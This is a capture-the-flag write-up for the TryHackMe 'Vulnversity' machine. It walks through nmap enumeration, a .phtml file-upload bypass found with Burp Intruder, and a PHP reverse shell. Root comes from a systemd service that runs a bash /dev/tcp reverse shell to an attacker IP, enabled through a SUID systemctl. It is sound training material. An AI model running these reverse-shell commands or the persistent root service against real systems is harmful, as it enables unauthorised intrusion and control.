# Vulnversity Write-up
## Overview

The objective of the challenge was to compromise a Linux host by identifying vulnerabilities, achieving initial access, escalating privileges, and obtaining both user-level and root-level access.

The approach taken follows a realistic penetration testing workflow, focusing on enumeration, exploitation, and privilege escalation rather than TryHackMe-specific shortcuts.

## Scope

The scope of this assessment was limited to a single target host provided by TryHackMe.
The goal was to obtain remote code execution, escalate privileges to root, and retrieve the designated flags. Denial-of-service attacks and brute-force techniques were considered out of scope.

## Executive Summary

The target system was successfully compromised by chaining two critical issues.
First, a flawed file upload validation allowed executable PHP code to be uploaded using an alternative file extension. This resulted in remote code execution as the webserver user.
Second, a severe local misconfiguration was identified: the systemctl binary was installed with the SUID bit set, allowing arbitrary systemd services to be started with root privileges. This led to full system compromise.

## Initial Enumeration

A full port and service scan was performed to identify exposed services.

nmap -sC -sV -oA nmap/initial <TARGET_IP>

The scan revealed an HTTP service running on a non-standard port (3333). Manual browsing identified a web application with a file upload feature located under /internal/.

## File Upload Vulnerability

The file upload functionality enforced server-side filtering based on file extensions. Any uploaded file resulted in the generic error message “Extension not allowed”, including common file types such as .txt and .jpg. No client-side validation was present in the HTML form.

This behavior indicated a whitelist-based filter implemented in the backend application logic. However, the whitelist was incomplete and did not fully align with the PHP interpreter configuration.

Using Burp Suite, the upload request was intercepted and analyzed. The filename field in the multipart/form-data request was isolated and tested systematically. By using Burp Intruder to vary only the file extension while keeping the request body constant, it was possible to identify extensions that bypassed the filter.

The .phtml extension was accepted by the application, despite being interpreted as PHP by the server. This allowed a PHP reverse shell payload to be uploaded successfully.

## Remote Code Execution

A PHP reverse shell based on the pentestmonkey implementation was uploaded using the .phtml extension. A Netcat listener was started on the attacking system:

nc -lvnp 4444

By accessing the uploaded file through the browser, a reverse shell was obtained as the webserver user.

whoami
www-data

The shell was stabilized to allow further enumeration.

## User Enumeration and User Flag

Enumeration of local users revealed a regular user account named bill.

cat /etc/passwd

The user flag was located in the home directory of this user: (as far as i remember)

/home/bill/user.txt

The flag was successfully accessed.

## Privilege Escalation

A search for SUID binaries was performed to identify potential privilege escalation vectors.

find / -perm -4000 -type f 2>/dev/null

Among standard binaries, /bin/systemctl stood out due to having the SUID bit set. This represents a critical misconfiguration, as systemctl allows full control over system services and should never run with elevated privileges.

### Privilege Escalation via systemctl

A custom systemd service was created to execute a reverse shell as root. The service file was written to a writable directory.

cat > /tmp/rootshell2.service << 'EOF'
[Unit]
Description=Persistent Root Shell

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.176.64/5555 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF"

A listener was started on the attacking system:

nc -lvnp 5555

The service was then enabled and started using the SUID-enabled systemctl binary:

/bin/systemctl enable /tmp/rootshell2.service
/bin/systemctl start rootshell2.service

This resulted in a stable reverse shell with root privileges.

whoami
root

## Root Flag

With root access established, the root flag was located in the root user’s home directory.

cd /root
ls
cat root.txt

The flag was successfully retrieved.

## What I Learned

This challenge reinforced the importance of chaining vulnerabilities rather than viewing issues in isolation. A strict extension whitelist can still be bypassed if it does not fully account for all executable file types supported by the backend interpreter.

On a tooling level, I deliberately explored multiple features of Burp Suite during this challenge. I worked with request interception to manipulate uploads manually, used the HTTP history to analyze server responses in detail, and applied Intruder both with targeted payload lists and with minimal single-position testing. Filtering responses based on content rather than status codes proved essential to identifying a successful bypass.

On the privilege escalation side, this room clearly demonstrated how dangerous SUID misconfigurations are when applied to powerful administrative tools. A single incorrect permission on systemctl effectively removed all privilege boundaries on the system.
